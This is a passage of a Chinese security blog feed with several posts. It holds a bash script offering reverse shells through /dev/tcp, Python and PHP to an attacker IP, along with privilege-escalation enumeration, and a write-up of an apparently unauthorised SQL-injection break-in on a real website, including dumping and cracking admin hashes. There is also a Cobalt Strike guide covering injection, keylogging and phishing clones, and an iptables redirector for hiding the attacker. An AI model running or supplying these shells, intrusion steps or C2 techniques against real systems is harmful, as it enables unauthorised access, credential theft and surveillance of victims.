&quot;[1]NC反弹shell&quot;    echo &quot;[2]python反弹shell&quot;    echo &quot;[3]PHP反弹shell&quot;    read input    if test $input -eq &quot;1&quot;    then        echo &quot;在攻击机执行nc -lvp 4444&quot;        echo &quot;输入攻击机的IP&quot;        read host        bash -i &gt;&amp; /dev/tcp/$host/4444 0&gt;&amp;1    elif test $input -eq &quot;2&quot;    then        echo &quot;在攻击机执行nc -lvp 4444&quot;        echo &quot;输入攻击机IP&quot;        read host        python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;$host&#39;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;    elif test $input -eq &quot;3&quot;    then        echo &quot;在攻击机执行nc -lvp 4444&quot;        echo &quot;输入攻击机IP&quot;        read host        php -r &#39;$sock=fsockopen(&quot;&#39;$host&#39;&quot;,4444);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;    fi}runs(){    wen_array=(&quot;https://www.cnblogs.com/linuxsec/articles/6080882.html&quot; &quot;https://guif.re/linuxeop&quot; &quot;https://www.ddosi.com/l/&quot; &quot;https://github.com/SecWiki/linux-kernel-exploits--Linux提权exp下载&quot; &quot;https:/              /shenaniganslabs.io/2019/02/13/Dirty-Sock.html&quot; &quot;https://www.secquan.org/Discuss/1069715&quot; &quot;https://www.cnblogs.com/hookjoy/p/6612595.html&quot;)    echo &quot;[1] 查看系统基本架构和信息&quot;    echo &quot;[2] 本机IP查询&quot;    echo &quot;[3] 列出以root权限运行的进程&quot;    echo &quot;[4] 寻找系统里可以用的SUID文件&quot;    echo &quot;[5] 查看系统环境变量&quot;    echo &quot;[6] 查看/etc/passwd文件权限和/etc/shadow文件权限&quot;    echo &quot;[7] 计划任务&quot;    echo &quot;[8] 查看网络信息&quot;    echo &quot;[9] 一些不错的提权文章&quot;    echo &quot;[10] 反弹shell&quot;    echo &quot;[11] 退出&quot;    read sum    if test $sum -eq &quot;1&quot;    then        echo &quot;---系统版本信息---&quot;        uname -a        echo &quot;---系统架构---&quot;        lsb_release -a        echo &quot;---系统版本---&quot;        cat /proc/version        jiet    elif test $sum -eq &quot;2&quot;    then        echo &quot;---本机IP信息---&quot;        ifconfig        jiet    elif test $sum -eq &quot;3&quot;    then        echo &quot;---以root权限运行的进程---&quot;        ps -fu root        jiet    elif test $sum -eq &quot;4&quot;    then        echo &quot;---可用的SUID文件---&quot;        find / -perm -u=s -type f 2&gt;/dev/null        jiet        elif test $sum -eq &quot;5&quot;    then        echo &quot;---PATH---&quot;        echo $PATH        jiet    elif test $sum -eq &quot;6&quot;    then        echo &quot;---passwd&amp;&amp;shadow&quot;        ls -l /etc | grep passwd        ls -l /etc | grep shadow        jiet    elif test $sum -eq &quot;7&quot;    then        echo &quot;---/etc内的计划任务---&quot;        ls -l /etc/cron*        jiet    elif test $sum -eq &quot;8&quot;    then        echo &quot;---网络信息---&quot;        netstat -antup        jiet    elif test $sum -eq &quot;9&quot;    then        echo &quot;---文章链接---&quot;        for((i=0;i&lt;${#wen_array[*]};i++)) do            echo ${wen_array[i]}        done        jiet    elif test $sum -eq &quot;10&quot;    then        echo &quot;---反弹shell---&quot;        fshell        jiet    elif test $sum -eq &quot;11&quot;    then        echo &quot;Bye&quot;        exit 0    fi}runs</code></pre><p>运行例子<br><img src="https://s2.ax1x.com/2019/07/27/eMF3RA.png" alt="eMF3RA.png"></p><p>查看基本信息<br><img src="https://s2.ax1x.com/2019/07/27/eMFYsP.png" alt="eMFYsP.png"></p><p>本机IP查询<br><img src="https://s2.ax1x.com/2019/07/27/eMFdIg.png" alt="eMFdIg.png"></p><p>以root权限运行的进程<br><img src="https://s2.ax1x.com/2019/07/27/eMFDRs.png" alt="eMFDRs.png"></p><p>找出系统可用的SUID文件<br><img src="https://s2.ax1x.com/2019/07/27/eMFcLV.png" alt="eMFcLV.png"></p><p>查看系统环境<br><img src="https://s2.ax1x.com/2019/07/27/eMFhi4.png" alt="eMFhi4.png"></p><p>查看/etc/passwd和/etc/shadow的读取权限<br><img src="https://s2.ax1x.com/2019/07/27/eMF5W9.png" alt="eMF5W9.png"></p><p>查看/etc内的计划任务<br><img src="https://s2.ax1x.com/2019/07/27/eMk478.png" alt="eMk478.png"></p><p>查看网络信息<br><img src="https://s2.ax1x.com/2019/07/27/eMAW8J.png" alt="eMAW8J.png"></p><p>一些提权的文章<br><img src="https://s2.ax1x.com/2019/07/27/eMAjxA.png" alt="eMAjxA.png"></p><p>反弹shell<br><img src="https://s2.ax1x.com/2019/07/27/eMESqP.png" alt="eMESqP.png"></p><p>反弹测试<br><img src="https://s2.ax1x.com/2019/07/27/eMEA2j.md.png" alt="eMEA2j.md.png"></p><p><img src="https://s2.ax1x.com/2019/07/27/eMEExs.png" alt="eMEExs.png"></p><p>使用帮助</p><pre><code>wget https://raw.githubusercontent.com/422926799/note/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Linux%E6%8F%90%E6%9D%83/%E7%94%A8%E4%BA%8E%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83%E7%9A%84sh/rsh.shchmod +x rsh.sh./rsh.sh</code></pre>]]></content>
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一次浪荡的渗透</title>
      <link href="/posts/949b4019.html"/>
      <url>/posts/949b4019.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=451171191&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在zoomeye瞎逛，找到个站，顺手搞搞，到后面还是没能拿下shell，kindeditor编辑器真草….</p><p><img src="https://s2.ax1x.com/2019/07/26/eu99t1.png" alt="eu99t1.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>zoomeye搜到的就是一个IP<br><img src="https://s2.ax1x.com/2019/07/26/eu9R41.png" alt="eu9R41.png"></p><p>whois就不查了，毛用没有又不是搞服务商…..除了自我安慰，哎<br>旁站查询走一波：<a href="http://www.webscan.cc/" target="_blank" rel="noopener">同IP网站查询,C段查询,IP反查域名,C段旁注,旁注工具</a><br><img src="https://s2.ax1x.com/2019/07/26/eu9f9x.png" alt="eu9f9x.png"></p><p>我他妈….<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p><p>用ip138查查同IP<br><a href="http://site.ip138.com" target="_blank" rel="noopener">域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询</a><br><img src="https://s2.ax1x.com/2019/07/26/euCV2V.png" alt="euCV2V.png"></p><p>域名全部ping了一遍…发现一个域名不是同一个IP，超级ping了一下，发现在山西有个节点<br><img src="https://s2.ax1x.com/2019/07/26/euC5in.png" alt="euC5in.png"></p><p>端口扫描了一波，发现有节点的那个域名出现在443端口，估计是多个域名解析到同一个DNS<br><img src="https://s2.ax1x.com/2019/07/26/euCzJ1.png" alt="euCzJ1.png"></p><p>7kb扫描工具一顿扫，没扫出来<br><img src="https://s2.ax1x.com/2019/07/26/euATDf.png" alt="euATDf.png"></p><p>。。。<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p><p>打开这个站一看，后台光明正大的写在主页<br><img src="https://s2.ax1x.com/2019/07/26/euEV2R.md.png" alt="euEV2R.md.png"></p><p>。。。<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p><p>整理了一下收集到的信息<br><img src="https://s2.ax1x.com/2019/07/26/euZkcR.png" alt="euZkcR.png"></p><p>随便点了一下链接发现有类似&amp;id=的url，测试了一下注入，发现SQL注入<br><img src="https://s2.ax1x.com/2019/07/26/euEgs0.png" alt="euEgs0.png"></p><p>当时就想着扔sqlmap里面跑，然后sqlmap报错。。后面想了一下这个的https证书是有问题的，还有就是sqlmap跑类似于以下的url会发神经</p><pre><code>http://test.com/test.php?user=demo&amp;id=1</code></pre><p><img src="https://s2.ax1x.com/2019/07/26/euEzJH.png" alt="euEzJH.png"></p><p>https证书有问题<br><img src="https://s2.ax1x.com/2019/07/26/euViOP.png" alt="euViOP.png"></p><p>百思不得其解的时候，搜到了篇文章<br><a href="https://michaelwayneliu.github.io/2018/08/28/sqlmap%E5%9C%A8https%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF/" target="_blank" rel="noopener">sqlmap在https情况下的一个错误 | MSAREHERE</a><br>文章的作者使用在本地写了个php，然后使用curl配置屏蔽掉https错误，然后在通过curl发送数据给目标站点</p><pre><code class="php">&lt;?php$url = &quot;http://xxx.com&quot;;$sql = $_GET[s];$s = urlencode($sql);$url = $url.$sql;echo $url;// $params = &quot;email=$s&amp;password=aa&quot;;//echo $params;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hostscurl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&#39;);curl_setopt($ch, CURLOPT_TIMEOUT, 15);// curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式// curl_setopt($ch, CURLOPT_POSTFIELDS, $params);$output = curl_exec($ch);curl_close($ch);echo $output;$a = strlen($output);echo $a;?&gt;</code></pre><p>本地访问了一下还真的ok<br><img src="https://s2.ax1x.com/2019/07/26/euVJkF.png" alt="euVJkF.png"></p><p>然后直接扔sqlmap跑就ok</p><pre><code>sqlmap -u http://127.0.0.1/demos.php?s=%20*</code></pre><p><img src="https://s2.ax1x.com/2019/07/26/euValR.png" alt="euValR.png"></p><p>然后发现不是dba权限<br><img src="https://s2.ax1x.com/2019/07/26/euVfXt.png" alt="euVfXt.png"></p><p>dump出后台的hash发现还有两个跑不出<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p><p>还好最后一个hash跑出来了<br><img src="https://s2.ax1x.com/2019/07/26/euVI78.png" alt="euVI78.png"></p><p>得到用户名密码<br><img src="https://s2.ax1x.com/2019/07/26/euZVnx.png" alt="euZVnx.png"></p><p>后台一登陆，看见编辑器kindeditor<br><img src="https://s2.ax1x.com/2019/07/26/euZsuq.png" alt="euZsuq.png"></p><p>google搜了一遍，发现只能重命名或者备份getshell<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p><p><a href="https://blog.dyboy.cn/websecurity/52.html" target="_blank" rel="noopener">[渗透实战]某铸造设备公司官网经典思路 - DYBOY - 专注程序开发与信息安全</a></p><p>原本打算子域名看看能不能搞的，查出来的都是什么<br><img src="https://s2.ax1x.com/2019/07/26/eueV2j.png" alt="eueV2j.png"><br>本文到此结束，真是玩毛….<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p>]]></content>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>coablstrike的用法</title>
      <link href="/posts/80762752.html"/>
      <url>/posts/80762752.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=422428200&auto=1&height=66"></iframe><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>Cobalt Strike 一款以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。<br>钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等。<br>Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。<br>Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p></blockquote><p>说白了就是个C&amp;C<br><img src="https://www.cobaltstrike.com/images/buynow-bg.png" alt="buynow-bg.png"></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><pre><code>javar-java version &quot;1.8.0_201&quot;Java(TM) SE Runtime Environment (build 1.8.0_201-b09)Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode)cobalstrike</code></pre><h2 id="服务端创建与连接"><a href="#服务端创建与连接" class="headerlink" title="服务端创建与连接"></a>服务端创建与连接</h2><p>cobalstrike里的目录<br><img src="https://s2.ax1x.com/2019/07/25/emkj6f.png" alt="emkj6f.png"></p><p>执行teamserver</p><pre><code>teamserver &lt;HOST&gt; &lt;PASSWORD&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/07/25/emAYnO.png" alt="emAYnO.png"></p><p>cs填写对应的IP和密码，用户名随便填<br><img src="https://s2.ax1x.com/2019/07/25/emAaAH.png" alt="emAaAH.png"></p><p>连接成功如下所示<br><img src="https://s2.ax1x.com/2019/07/25/emAB9I.png" alt="emAB9I.png"></p><h2 id="后门生成"><a href="#后门生成" class="headerlink" title="后门生成"></a>后门生成</h2><p>配置监听<br><img src="https://s2.ax1x.com/2019/07/25/emkHkd.md.png" alt="emkHkd.md.png"></p><p>监听模块说明</p><pre><code>beacon  为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs,该shell所支持的通信协议主要包括这几种,dns,https,http,smb[pipe],另外,beacon shell的内置功能也非常多,后面我们会再详细说foreign 主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器</code></pre><p>根据自己的条件生成对应的后门<br><img src="https://s2.ax1x.com/2019/07/25/emFTGq.png" alt="emFTGq.png"></p><p>当在受害机上执行了生成的payload或者后门后，将反弹一个会话<br><img src="https://s2.ax1x.com/2019/07/25/emAX59.png" alt="emAX59.png"></p><p>我们可以对着这个会话一顿猛干</p><p>PS:<br>记得修改会话的延时时间，cs默认60秒接收一次执行<br><img src="https://s2.ax1x.com/2019/07/25/emEY2q.png" alt="emEY2q.png"></p><p>修改为5秒按确认即可</p><h2 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h2><p>获取到shell之后进入交互输入help可以看到帮助<br><img src="https://s2.ax1x.com/2019/07/25/emEsi9.png" alt="emEsi9.png"></p><p>输入help command可以看到详细的命令信息<br>例如：</p><pre><code>help inject</code></pre><h2 id="进程查看"><a href="#进程查看" class="headerlink" title="进程查看"></a>进程查看</h2><p>执行ps命令可以查看受害机上运行的进程<br><img src="https://s2.ax1x.com/2019/07/25/emEe2t.png" alt="emEe2t.png"></p><h2 id="进程欺骗"><a href="#进程欺骗" class="headerlink" title="进程欺骗"></a>进程欺骗</h2><p>argue用于欺骗日志记录</p><pre><code>argue calc /spoofed</code></pre><p><img src="https://s2.ax1x.com/2019/07/25/emE2M6.png" alt="emE2M6.png"></p><p>进程查看<br><img src="https://s2.ax1x.com/2019/07/25/emEoid.png" alt="emEoid.png"></p><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>inject用于像指定进程注入，进程注入后将生成新的会话</p><pre><code>inject &lt;PID&gt; &lt;x64|x64&gt; []进程名]</code></pre><p><img src="https://s2.ax1x.com/2019/07/25/emVs0S.png" alt="emVs0S.png"></p><p>这里忘记截图了，引用一张gif<br><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdvZd5qH8L-aNwMTY9%2F-LVdxRlTo3-eQwGHPUTO%2FPeek%202019-01-07%2020-16.gif?alt=media&amp;token=4ca41a85-e57a-4318-8cfe-536515f0169e" alt="assets%2F-LFEMnER3fywgFHoroYn%2F-LVdvZd5qH8L-aNwMTY9%2F-LVdxRlTo3-eQwGHPUTO%2FPeek%202019-01-07%2020-16.gif?alt=media&amp;token=4ca41a85-e57a-4318-8cfe-536515f0169e"></p><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><p>keylogger用于记录受害者通过键盘在机子执行了什么</p><pre><code>keylogger &lt;PID&gt; &lt;x86|X64&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/07/25/emZPtH.png" alt="emZPtH.png"></p><p>记录到的输入内容<br><img src="https://s2.ax1x.com/2019/07/25/emZihd.png" alt="emZihd.png"> </p><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p>screehost<br><img src="https://s2.ax1x.com/2019/07/25/eml2h8.png" alt="eml2h8.png"></p><h2 id="从指定的父进程启动一个新的进程"><a href="#从指定的父进程启动一个新的进程" class="headerlink" title="从指定的父进程启动一个新的进程"></a>从指定的父进程启动一个新的进程</h2><p>run用于启动一个信的进程</p><pre><code>run &lt;PID&gt; 进程例如：run 2348 calcrun 进程run calc</code></pre><p><img src="https://s2.ax1x.com/2019/07/25/emlO9U.png" alt="emlO9U.png"></p><h2 id="powershell脚本注入"><a href="#powershell脚本注入" class="headerlink" title="powershell脚本注入"></a>powershell脚本注入</h2><p>psinject允许从任意进程中注入powershell脚本</p><pre><code>psinject &lt;pid&gt; powershell脚本</code></pre><p><img src="https://s2.ax1x.com/2019/07/25/em18gg.png" alt="em18gg.png"></p><h2 id="浏览器反向代理"><a href="#浏览器反向代理" class="headerlink" title="浏览器反向代理"></a>浏览器反向代理</h2><p>browserpivot用来监听受害者的浏览器</p><pre><code>browserpivot  &lt;PID&gt; &lt;x64|x86&gt;</code></pre><p>这里并没有成功，引用某文章gif<br><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVe7nLVoH8BOhlPzZg6%2F-LVeElowN_sNm3icObi4%2FPeek%202019-01-07%2021-36.gif?alt=media&amp;token=03ddc4e7-aa4b-49a5-b3ce-aca872262a3c" alt="assets%2F-LFEMnER3fywgFHoroYn%2F-LVe7nLVoH8BOhlPzZg6%2F-LVeElowN_sNm3icObi4%2FPeek%202019-01-07%2021-36.gif?alt=media&amp;token=03ddc4e7-aa4b-49a5-b3ce-aca872262a3c"></p><h2 id="应用信息收集"><a href="#应用信息收集" class="headerlink" title="应用信息收集"></a>应用信息收集</h2><p>生成应用信息收集url，受害者访问后就会得到受害者的机子安装了什么PE<br><img src="https://s2.ax1x.com/2019/07/25/em3Crj.png" alt="em3Crj.png"></p><h2 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h2><p>使用cs克隆指定的网站然后言语诱惑受害人，骗他输入密码<br><img src="https://s2.ax1x.com/2019/07/25/em30eA.png" alt="em30eA.png"></p><p>网页键盘记录<br><img src="https://s2.ax1x.com/2019/07/25/em3gSS.png" alt="em3gSS.png"></p><h2 id="cs派会话"><a href="#cs派会话" class="headerlink" title="cs派会话"></a>cs派会话</h2><p>当获取到一个cs的shell后可以联动到msf，首先msf那边执行一个监听，然后cs在配置一个监听器即可<br><img src="https://s2.ax1x.com/2019/07/25/em89fK.png" alt="em89fK.png"></p><h2 id="msf提权常用的操作"><a href="#msf提权常用的操作" class="headerlink" title="msf提权常用的操作"></a>msf提权常用的操作</h2><p>cs的getsystem提权<br><img src="https://s2.ax1x.com/2019/07/25/em8UhV.png" alt="em8UhV.png"></p><p>msf搜索提权用的模块</p><pre><code>exploit/recon/local_exploit_suggester</code></pre><p><img src="https://s2.ax1x.com/2019/07/25/emGvPx.png" alt="emGvPx.png"></p><p>提权利用<br><img src="https://s2.ax1x.com/2019/07/25/emJZJP.png" alt="emJZJP.png"></p>]]></content>
      
      
        <tags>
            
            <tag> 红队实验 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HTTP转发器/中继器</title>
      <link href="/posts/2d3088f.html"/>
      <url>/posts/2d3088f.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以下这系列的文章，都是根据。如下链接进行学习总结：<br><a href="https://ired.team" target="_blank" rel="noopener">About /? - Red Teaming Experiments</a></p><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ul><li>通过端口转发，来模糊攻击者的真实IP</li><li>如果被检测到可疑活动，可以进行替换</li></ul><h2 id="使用iptables进行转发"><a href="#使用iptables进行转发" class="headerlink" title="使用iptables进行转发"></a>使用iptables进行转发</h2><p>IP划分：<br><img src="https://s2.ax1x.com/2019/07/24/eADeKO.png" alt="eADeKO.png"></p><p>创建一个转发</p><pre><code>iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT -&gt;默认链设置为INPUT,协议设置为TCP，目的端口为80，跳到没有返回的链上ACCEPTiptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.2:80 -&gt; 新增加一条，将10.0.0.2:80端口的流量转发到本地的80端口iptables -t nat -A POSTROUTING -j MASQUERADE -&gt; IP伪装iptables -I FORWARD -j ACCEPT -&gt; 接受任何目的地IP访问iptables -P FORWARD ACCEPT -&gt; 转发接受sysctl net.ipv4.ip_forward=1 -&gt; IP转发</code></pre><p><img src="https://s2.ax1x.com/2019/07/24/eADnqe.png" alt="eADnqe.png"></p><p>测试<br><img src="https://s2.ax1x.com/2019/07/24/eADKVH.png" alt="eADKVH.png"></p><p>简单的区分一下：<br><img src="https://s2.ax1x.com/2019/07/24/eADQIA.png" alt="eADQIA.png"></p><p>删除iptables上的nat表的规则</p><pre><code>iptables -t nat -L -n --line-numbers -&gt; 查看NAT表中的规则iptables -t nat -D PREROUTING 1 -&gt; 删除NAT表中序号为1的规则</code></pre><p>一个可以用的小脚本</p><pre><code class="shell">echo &quot;转发到本地的端口设置:&quot;read dsportecho &quot;远程IP设置(例如:192.168.6.5:80):&quot;read dhostiptables -I INPUT -p tcp -m tcp --dport $dsport -j ACCEPTiptables -t nat -A PREROUTING -p tcp --dport $dsport -j DNAT --to-destination $dhostiptables -t nat -A POSTROUTING -j MASQUERADEiptables -I FORWARD -j ACCEPTiptables -P FORWARD ACCEPTsysctl net.ipv4.ip_forward=1echo &quot;[*]查看策略&quot;iptables -L -t nat</code></pre><p><img src="https://s2.ax1x.com/2019/07/24/eADdaj.png" alt=""></p><p>我真佩服那些把iptables记下来的大哥..</p><p>END</p>]]></content>
      
      
        <tags>
            
            <tag> 红队实验 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>漏洞盒子自动化交漏洞</title>
      <link href="/posts/b36db5a6.html"/>
      <url>/posts/b36db5a6.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>嫌手动打开网页提交漏洞太草了，就有了这个工具<br>Github地址：<a href="https://github.com/422926799/python/tree/master/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">漏洞盒子自动提交漏洞工具</a></p><p>PS：单个提交的时候记得去掉提交漏洞哪行的注释</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用selenium模块来模仿浏览器进行点击，从而实现<br>快速提交漏洞的手法</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>模拟点击的代码：</p><pre><code class="python">   chrome.find_element_by_name(&#39;bug_title&#39;).send_keys(bug[&#39;漏洞标题&#39;]) #填写漏洞标题        if bug[&#39;漏洞类别&#39;]==&#39;事件型漏洞&#39;: #设置漏洞类别            leix=chrome.find_elements_by_name(&#39;bug_internet_type&#39;)[tyon[0]]            leix.click()        else:            leix=chrome.find_elements_by_name(&#39;bug_internet_type&#39;)[tyon[1]]            leix.click()        chrome.find_element_by_name(&#39;bug_firm_name&#39;).send_keys(bug[&#39;厂商信息&#39;]) #填写厂商信息        chrome.find_element_by_name(&#39;bug_firm_url&#39;).send_keys(bug[&#39;所属域名&#39;]) #所属域名        chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[5]/div/div[1]/div&#39;).click() #点击漏洞类型的界面        chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[5]/div/div[2]/div/ul/li[1]/a&#39;).click() #点击Web漏洞        chrome.find_element_by_xpath(web_bug[bug[&#39;漏洞类型&#39;]]).click()        chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[6]/div/div/button&#39;).click() #点击漏洞级别的框框        chrome.find_element_by_xpath(bug_level[bug[&#39;漏洞等级&#39;]]).click()        chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[8]/div/textarea&#39;).send_keys(bug[&#39;漏洞描述&#39;]) #漏洞描述        chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[15]/div/div[2]/div[1]/div[4]&#39;).send_keys(bug[&#39;复现步骤&#39;])  # 填写复现步骤        for tup in images:            chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[15]/div/div[2]/div[1]/div[1]/ul/li[13]/a&#39;).click() #点击图片上传            chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[15]/div/div[2]/div[1]/div[1]/ul/li[13]/div/ul/li[1]/a&#39;).click()            time.sleep(1)            dialog = win32gui.FindWindow(&#39;#32770&#39;, &#39;打开&#39;)  # 对话框            ComboBoxEx32 = win32gui.FindWindowEx(dialog, 0, &#39;ComboBoxEx32&#39;, None)            ComboBox = win32gui.FindWindowEx(ComboBoxEx32, 0, &#39;ComboBox&#39;, None)            Edit = win32gui.FindWindowEx(ComboBox, 0, &#39;Edit&#39;, None)  # 上面三句依次寻找对象，直到找到输入框Edit对象的句柄            button = win32gui.FindWindowEx(dialog, 0, &#39;Button&#39;, None)  # 确定按钮Button            win32gui.SendMessage(Edit, win32con.WM_SETTEXT, None, r&#39;{}&#39;.format(tup))  # 往输入框输入绝对地址            win32gui.SendMessage(dialog, win32con.WM_COMMAND, 1, button)  # 按button            chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[15]/div/div[2]/div[1]/div[4]&#39;).send_keys(Keys.ENTER)        chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[17]/div/div/div[1]/div[4]&#39;).send_keys(bug[&#39;修复方案&#39;]) #填写修复方案        if bug[&#39;匿名&#39;]==&#39;否&#39;:            chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[18]/div/div/div/div/span[3]&#39;).click()        else:            pass        data=open(str(bug[&#39;漏洞POC请求包&#39;]),&#39;r&#39;,encoding=&#39;utf-8&#39;).read()        print(data)        try:            chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[9]/div/input&#39;).send_keys(bug[&#39;漏洞url/位置&#39;]) #填写漏洞URL        except:            pass        try:            chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[10]/div/input&#39;).send_keys(bug[&#39;影响参数&#39;]) #填写影响参数        except:            pass        try:            chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[11]/div&#39;).click()            chrome.find_element_by_xpath(&#39;//*[@id=&quot;submitform&quot;]/div[11]/div/textarea&#39;).send_keys(data)        except:            pass        chrome.find_element_by_xpath(&#39;//*[@id=&quot;submit&quot;]&#39;).click() #提交漏洞</code></pre><p>然后文件上传的实现就是，通过win32api来检测这个窗口。然后输出要上传的文件路径<br>然后点击确认即可</p><p>参考文章：<br><a href="https://www.jianshu.com/p/fba37cc5d5e2" target="_blank" rel="noopener">Selenium+Python上传文件方法大全 - 简书</a><br><a href="https://www.cnblogs.com/skying555/p/6137541.html" target="_blank" rel="noopener">python和pywin32实现窗口查找、遍历和点击 - alex.shu - 博客园</a><br><a href="https://www.cnblogs.com/yxi-liu/p/selenium.html" target="_blank" rel="noopener">python-selenium模块简单使用 - 檐夏 - 博客园</a></p><p>效果图：<br><img src="https://s2.ax1x.com/2019/07/17/ZL97W9.gif" alt=""></p><h2 id="一些坑"><a href="#一些坑" class="headerlink" title="一些坑"></a>一些坑</h2><p>webdriver.Chrome()不能放在函数内，否则请求完第一个url就退出浏览器…<br>原因：你放在函数内的话，这个函数执行完成后就会结束</p><pre><code class="python">from selenium import webdriverdef demo():    chrome=webdriver.Chrome()    chrome.get(&#39;https://www.baidu.com&#39;)if __name__ == &#39;__main__&#39;:    demo()</code></pre><p><img src="https://s2.ax1x.com/2019/07/18/ZXTggO.gif" alt=""></p><h2 id="Xpath的小技巧"><a href="#Xpath的小技巧" class="headerlink" title="Xpath的小技巧"></a>Xpath的小技巧</h2><p>这里手动@木头，并送出一个吻<br>Chrome或Firefox选择指定部分后选择：检查-&gt;Copy-&gt;Copy Xpath</p><p><img src="https://s2.ax1x.com/2019/07/18/ZX7con.gif" alt="ZX7con.md.gif"></p><p>END</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>编写自己的nmap脚本</title>
      <link href="/posts/81575c3f.html"/>
      <url>/posts/81575c3f.html</url>
